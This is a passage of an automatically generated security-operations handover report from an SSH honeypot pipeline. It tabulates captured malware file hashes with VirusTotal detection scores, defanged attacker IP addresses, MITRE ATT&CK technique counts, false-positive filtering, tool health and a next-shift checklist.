| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `104.199.176[.]250` | TW | Google LLC | **100** ⚠️ | 50 |
| `185.242.226[.]18` | NL | HostUS Solutions LLC | **100** ⚠️ | 50 |
| `156.238.236[.]179` | HK | cognetcloud INC | **100** ⚠️ | 16 |
| `43.167.10[.]243` | JP | ACEVILLE PTE.LTD. | **100** ⚠️ | 6 |
| `14.103.112[.]104` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `36.64.131[.]68` | ID | PT TELKOM INDONESIA Menara Multimedia Lt.7 Jl. Kebon sirih No.12 JAKARTA | **100** ⚠️ | 0 |
| `106.12.6[.]79` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 50 |
| `103.88.76[.]27` | IN | Thamizhaga Internet Communications Private Limited | **100** ⚠️ | 50 |
| `101.36.112[.]103` | HK | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | **100** ⚠️ | 6 |
| `20.244.18[.]126` | IN | Microsoft Corporation | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 70 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 39 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 26 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 13 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 13 |

---

## 🔕 False Positive Summary (6 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 3 |
| AbuseIPDB score 18 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 2 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 79 cases |
| Tool 34  | Credential Extractor        | ✅ 65 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 3 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 18 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 6 filtered (7.6%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 14 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 32 files |
| Tool 33  | YARA Classifier             | ✅ 10 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 26 priority case(s) shown individually · 12 recon entry/entries in table (3 group(s) consolidating 38 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-06-06T23:08:25Z_
